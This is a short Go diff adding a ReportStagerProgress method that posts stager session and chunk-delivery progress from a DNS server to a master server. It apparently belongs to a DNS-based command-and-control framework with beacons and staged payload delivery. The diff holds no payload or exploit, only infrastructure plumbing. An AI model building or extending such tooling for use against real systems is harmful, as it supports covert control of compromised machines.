@@ -370,6 +370,33 @@ func (mc *MasterClient) SubmitProgress(taskID, beaconID string, receivedChunks, 
 	return nil
 }
 
+// ReportStagerProgress reports chunk delivery progress for a stager session
+func (mc *MasterClient) ReportStagerProgress(sessionID string, chunkIndex int, stagerIP string) error {
+	req := map[string]interface{}{
+		"dns_server_id": mc.serverID,
+		"api_key":       mc.apiKey,
+		"session_id":    sessionID,
+		"chunk_index":   chunkIndex,
+		"stager_ip":     stagerIP,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/stager/progress", req)
+	if err != nil {
+		return fmt.Errorf("stager progress report failed: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return fmt.Errorf("failed to parse stager progress response: %w", err)
+	}
+
+	if !resp.Success {
+		return fmt.Errorf("stager progress report rejected: %s", resp.Message)
+	}
+
+	return nil
+}
+
 // StartPeriodicCheckin starts a background goroutine for periodic check-ins
 func (mc *MasterClient) StartPeriodicCheckin(interval time.Duration, statsFn func() map[string]interface{}, cacheHandler func([]StagerCacheTask)) {
 	ticker := time.NewTicker(interval)
